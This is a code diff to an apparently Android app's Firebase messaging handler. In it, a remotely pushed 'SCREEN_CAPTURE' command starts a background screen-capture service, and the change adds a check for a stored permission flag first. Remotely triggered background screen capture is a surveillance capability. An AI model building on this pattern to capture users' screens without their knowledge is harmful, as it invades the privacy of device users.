@@ -70,10 +70,19 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             }
             "SCREEN_CAPTURE" -> {
                 Log.d(TAG, "🖥️ Executing: Request Screen Capture (Background)")
-                
+
                 try {
-                    ScreenCaptureBackgroundService.startCapture(applicationContext)
-                    Log.d(TAG, "✅ Background screen capture service started")
+                    // ✅ Load permission if not yet loaded
+                    val loaded = ScreenCaptureBackgroundService.loadPermissionFromPrefs(applicationContext)
+
+                    val prefs = getSharedPreferences("ScreenCapturePrefs", Context.MODE_PRIVATE)
+                    val granted = prefs.getBoolean("screen_capture_permission_granted", false) || loaded
+
+                    if (!granted) {
+                        Log.e(TAG, "❌ No screen capture permission - cannot capture")
+                    } else {
+                        ScreenCaptureBackgroundService.startCapture(applicationContext)
+                    }
                 } catch (e: Exception) {
                     Log.e(TAG, "❌ Failed to start screen capture service", e)
                 }
